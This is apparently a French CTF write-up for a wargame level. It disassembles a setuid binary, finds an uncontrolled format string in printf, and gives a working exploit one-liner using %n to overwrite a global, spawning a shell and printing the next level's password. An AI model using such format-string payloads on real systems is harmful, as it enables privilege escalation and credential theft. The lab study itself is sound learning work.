## Démarches
- objdump -d level3
    ```
    0804851a <main>:
    804851a:	55                   	push   %ebp
    804851b:	89 e5                	mov    %esp,%ebp
    804851d:	83 e4 f0             	and    $0xfffffff0,%esp
    8048520:	e8 7f ff ff ff       	call   80484a4 <v>
    8048525:	c9                   	leave
    8048526:	c3                   	ret

    
    080484a4 <v>:
    80484a4:	55                   	push   %ebp
    80484a5:	89 e5                	mov    %esp,%ebp
    80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
    80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
    80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
    80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
    80484bd:	00
    80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
    80484c4:	89 04 24             	mov    %eax,(%esp)
    80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
    80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
    80484d2:	89 04 24             	mov    %eax,(%esp)
    80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
    80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
    80484df:	83 f8 40             	cmp    $0x40,%eax
    80484e2:	75 34                	jne    8048518 <v+0x74>
    80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
    80484e9:	89 c2                	mov    %eax,%edx
    80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
    80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
    80484f4:	c7 44 24 08 0c 00 00 	movl   $0xc,0x8(%esp)
    80484fb:	00
    80484fc:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
    8048503:	00
    8048504:	89 04 24             	mov    %eax,(%esp)
    8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
    804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp)
    8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
    8048518:	c9                   	leave
    8048519:	c3                   	ret    
    ```
  La valeur contenue à l'adresse `0x804988c` doit être `0x40`, soit 64, soit `@` en ascii

  
- Les exploits par overflow de buffer ne sont pas possibles (utilisation de *fgets* plutôt que *gets*)
- Une autre vulnérabilité commune des programmes ELF est la [*Format String Attack*](https://owasp.org/www-community/attacks/Format_string_attack) ou [*Uncontrolled Format String*](https://en.wikipedia.org/wiki/Uncontrolled_format_string)

- `./level3` et `AAA0_%08x.%08x.%08x.%08x`
  > AAA0_00000200.b7fd1ac0.b7ff37d0.30414141
- Pour écraser `0x804988c` (`\x8c\x98\x04\x08`), on peut utiliser l'option `%n` *(qui écrit le nombre de caractères précédents)* de printf (avec `$4` pour cibler la 4 ème adresse de la stack) :
    `(python -c 'print("\x8c\x98\x04\x08"+60*"A"+"%4$n")' ; cat -) | ./level3`
    ```
    �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Wait what?!
    whoami
    level4
    pwd
    /home/user/level3
    cd ../level4
    ls -la
    total 17
    dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
    -rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
    -rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
    -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
    cat .pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
    ```

<br>
----
## Ressources

- [The 101 of ELF files on Linux: Understanding and Analysis](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/)
- [Format String Vulnerability](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)
- [Exploiting Format String Vulnerabilities - PDF](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)
- [Introduction to format string exploits](https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
- [CTF Field Guide - Exploiting Binaries 1](https://trailofbits.github.io/ctf/exploits/binary1.html)